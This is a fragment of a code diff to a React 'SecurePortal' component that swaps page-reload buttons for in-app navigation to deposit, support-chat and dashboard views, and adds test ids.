-            <Button onClick={() => window.location.reload()} variant="outline" className="w-full" data-testid="button-return">Return to Dashboard</Button>
+            
+            <div className="space-y-3">
+              <Button 
+                className="w-full bg-primary" 
+                onClick={() => setViewState('deposit')}
+              >
+                <Wallet className="w-4 h-4 mr-2" />
+                Go to Deposit Page
+              </Button>
+              <Button 
+                variant="outline" 
+                className="w-full"
+                onClick={() => setIsChatOpen(true)}
+              >
+                <MessageCircle className="w-4 h-4 mr-2" />
+                Contact Support
+              </Button>
+              <Button 
+                variant="ghost" 
+                className="w-full"
+                onClick={() => setViewState('dashboard')}
+              >
+                <Home className="w-4 h-4 mr-2" />
+                Back to Dashboard
+              </Button>
+            </div>
           </div>
         </motion.div>
       </div>
@@ -609,8 +1334,8 @@ export default function SecurePortal() {
             </CardContent>
           </Card>
 
-          <Button variant="outline" className="border-slate-700 text-slate-300" onClick={() => window.location.reload()} data-testid="button-logout">
-            <ArrowLeft className="w-4 h-4 mr-2" /> Logout
+          <Button variant="outline" className="border-slate-700 text-slate-300" onClick={() => setViewState('dashboard')} data-testid="button-back-dashboard">
+            <ArrowLeft className="w-4 h-4 mr-2" /> Back to Dashboard
           </Button>
         </div>
       </div>
@@ -651,6 +1376,14 @@ export default function SecurePortal() {
               </div>
             </div>
             <div className="flex items-center gap-4">
+              <Button 
+                variant="ghost" 
+                size="sm" 
+                onClick={() => setViewState('dashboard')}
+                data-testid="button-back-dashboard"
+              >
+                <ArrowLeft className="w-4 h-4 mr-2" /> Dashboard
+              </Button>
               {submissions.length > 0 && (
                 <Button 
                   variant="outline" 
@@ -878,6 +1611,7 @@ export default function SecurePortal() {
             animate={{ opacity: 1, y: 0 }}
             exit={{ opacity: 0, y: 100 }}
             className="fixed bottom-6 right-6 z-50 w-80 sm:w-96 h-[500px] bg-white rounded-lg shadow-2xl border border-slate-200 flex flex-col overflow-hidden"
+            data-testid="chat-panel"
           >
             <div className="bg-blue-600 text-white px-4 py-3 flex justify-between items-center">
               <div className="flex items-center gap-2">
